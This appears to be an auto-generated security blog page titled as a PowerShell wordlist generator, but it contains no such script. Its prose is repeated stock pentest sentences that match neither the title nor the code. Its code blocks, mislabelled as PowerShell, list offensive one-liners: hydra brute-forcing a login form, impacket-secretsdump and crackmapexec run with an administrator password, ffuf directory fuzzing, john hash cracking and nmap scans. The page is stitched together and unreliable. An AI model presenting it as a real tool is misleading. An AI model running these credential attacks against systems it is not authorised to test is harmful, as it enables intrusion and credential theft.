---
TitleSEO: "Custom Wordlist Generator in PowerShell | ZureFX"
TitlePost: "Custom Wordlist Generator — PowerShell"
Author: "ZureFX"
Description: "A PowerShell script for custom wordlist generator. Built for security research and automation."
Keywords: "c, python, script, rust, tool, powershell"
URL: "https://zurefx.github.io/scripting/script-custom-wordlist-generator-541.html"
URL_IMAGES: ""
Date: "2024-05-03"
Tags: "C, Python, Script, Rust, Tool, PowerShell"
Section: "scripting"
Lang: "en"
main_img: "script-custom-wordlist-generator-541"
Permalink: "/scripting/script-custom-wordlist-generator-541.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Authentication bypass was achieved through careful manipulation of the login mechanism. Token impersonation allowed elevation to SYSTEM privileges on the target. The service was running without proper input validation, leading to injection vulnerabilities.

Built with **PowerShell** for offensive security automation.

### Requirements

- PowerShell
- `secretsdump`
- `sharphound`
- `hydra`

## Implementation

### Core Logic

The target system was identified as running a vulnerable version of the service. The database credentials were hardcoded in the application source code.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.124.60.230 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.11.233.55
nmap -sCV -p1433,3306,23 10.27.168.133 -oN scan.txt
```

Token impersonation allowed elevation to SYSTEM privileges on the target. The service was running without proper input validation, leading to injection vulnerabilities.

### Helper Functions

Privilege escalation was possible due to misconfigured sudo permissions. Privilege escalation was possible due to misconfigured sudo permissions.

```powershell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.64.204.189/FUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.59.221.186/FUZZ
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
feroxbuster -h
```

## Usage

### Basic Usage

The kernel version was outdated and vulnerable to a publicly known exploit. Unconstrained delegation was enabled on the compromised machine.

```bash
crackmapexec smb 10.88.165.235 -u administrator -p 'P@ssw0rd!' --shares
```

### Advanced Options

The service was running without proper input validation, leading to injection vulnerabilities. The backup files contained sensitive information that should not have been accessible. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
crackmapexec smb 10.30.185.97 -u administrator -p 'P@ssw0rd!' --shares
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.40.57.185/FUZZ
crackmapexec smb 10.81.70.41 -u administrator -p 'P@ssw0rd!' --shares
nmap -sCV -p9200,389,110 10.124.163.114 -oN scan.txt
```

## Output

### Example Output

Post-exploitation enumeration revealed a path to domain administrator privileges. Weak file permissions allowed modification of critical system files.

```
[+] Scanning target...
[+] Found 9 results
[+] Done in 10.73s
```
